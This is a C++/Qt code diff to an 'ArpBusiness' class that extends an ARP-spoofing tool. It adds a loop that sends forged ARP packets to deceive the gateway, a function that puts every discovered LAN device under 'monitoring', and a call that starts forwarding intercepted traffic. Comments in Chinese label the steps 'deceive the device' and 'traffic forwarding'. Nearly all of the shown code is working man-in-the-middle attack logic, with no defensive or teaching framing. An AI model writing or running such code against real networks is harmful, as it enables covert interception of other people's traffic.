@@ -105,6 +105,14 @@ void ArpBusiness::run()
 				mNetmanager->send((unsigned char*)arpdata->data(), arpdata->size());
 				iter++;
 			}
+			QHash<QString, ArpPack>::iterator iter1= mDeceiveGateWayHash.begin();
+			while (iter1 != mDeceiveGateWayHash.end())
+			{
+				ArpPack& tmpPck = iter1.value();
+				std::shared_ptr<QByteArray> arpdata = Arp::Instance().createPack(tmpPck);
+				mNetmanager->send((unsigned char*)arpdata->data(), arpdata->size());
+				iter1++;
+			}
 		}
 		QThread::sleep(1);
 	}
@@ -121,6 +129,19 @@ void ArpBusiness::run()
  	{
 		mDeceiveHash.remove(ip);
  	}
+ }
+
+ void ArpBusiness::addDeceiveGateWay(const QString& ip, const ArpPack& info)
+ {
+	 mDeceiveGateWayHash.insert(ip, info);
+ }
+
+ void ArpBusiness::deleteDeceiveGateWay(const QString& ip)
+ {
+	 if (mDeceiveGateWayHash.contains(ip))
+	 {
+		 mDeceiveGateWayHash.remove(ip);
+	 }
  }
 
 void ArpBusiness::addDisconnectNet(const QString& ip)
@@ -148,6 +169,10 @@ void ArpBusiness::addOnitor(const QString& ip)
 		{
 			return;
 		}
+		if (ip == mNetinfo.gateway)
+		{
+			return;
+		}
 		mOnitorList.push_back(ip);
 		
 		//骗设备
@@ -172,16 +197,17 @@ void ArpBusiness::addOnitor(const QString& ip)
 		macStrToByte(arpPack1.targetMac, mDeviceInfo[mNetinfo.gateway]);
 		ipStrToByte(arpPack1.targetIp, mNetinfo.gateway);
 
-		addDeceive(mNetinfo.gateway, arpPack1);
-
+		//addDeceive(mNetinfo.gateway, arpPack1);
+		addDeceiveGateWay(ip, arpPack1);
 		//流量转发
-		TransmitInfo transmitInfo;
-		macStrToByte(transmitInfo.devMac, mDeviceInfo[ip]);
-		macStrToByte(transmitInfo.gatewayMac, mDeviceInfo[mNetinfo.gateway]);
-		macStrToByte(transmitInfo.mMac, mNetinfo.mac);
-		ipStrToByte(transmitInfo.devIP, ip);
-		ipStrToByte(transmitInfo.mIP, mNetinfo.ip);
-		NetTransmit::Instance().addTransmitDev(transmitInfo);
+		//TransmitInfo transmitInfo;
+		//macStrToByte(transmitInfo.devMac, mDeviceInfo[ip]);
+		//macStrToByte(transmitInfo.gatewayMac, mDeviceInfo[mNetinfo.gateway]);
+		//macStrToByte(transmitInfo.mMac, mNetinfo.mac);
+		//ipStrToByte(transmitInfo.devIP, ip);
+		//ipStrToByte(transmitInfo.mIP, mNetinfo.ip);
+		//NetTransmit::Instance().addTransmitDev(transmitInfo);
+		NetTransmit::Instance().startTransmit();
 	}
 }
 
@@ -194,6 +220,16 @@ void ArpBusiness::deleteOnitor(const QString& ip)
 	}
 }
 
+void ArpBusiness::globalOnitor()
+{
+	QHash<QString, QString>::iterator itor = mDeviceInfo.begin();
+	while (itor!= mDeviceInfo.end())
+	{
+		addOnitor(itor.key());
+		itor++;
+	}
+}
+
 void ArpBusiness::broadcast()
 {
 	NetInterfaceInfo tmpinfo = XuNetInterfaceManager::Instance()->getCurNetfaceInfo();
@@ -203,6 +239,8 @@ void ArpBusiness::broadcast()
 		tmpPck.disMac.push_back(0XFF);
 		tmpPck.targetMac.push_back(char(0));
 	}
+	mDeviceInfo.clear();
+	mDeviceInfoByte.clear();
 	ipStrToByte(tmpPck.sendIp, tmpinfo.ip);
 	macStrToByte(tmpPck.surMac, tmpinfo.mac);
 	macStrToByte(tmpPck.sendMac, tmpinfo.mac);
@@ -234,8 +272,31 @@ bool ArpBusiness::receiveData(std::shared_ptr<QByteArray> data)
 			{
 				mDeviceInfo.insert(ip,mac);
 			}
+			if (!mDeviceInfoByte.contains(ipArray))
+			{
+				mDeviceInfoByte.insert(ipArray, macArray);
+			}
 			emit findDevice(ip,mac);
 		}
 	}
     return true;
 }
+
+QString ArpBusiness::getMacByIp(const QString& ip)
+{
+	if (mDeviceInfo.contains(ip))
+	{
+		return mDeviceInfo[ip];
+	}
+	return "";
+}
+
+QByteArray ArpBusiness::getMacByIp(const QByteArray& ip)
+{
+	if (mDeviceInfoByte.contains(ip))
+	{
+		return mDeviceInfoByte[ip];
+	}
+	return QByteArray();
+}
+
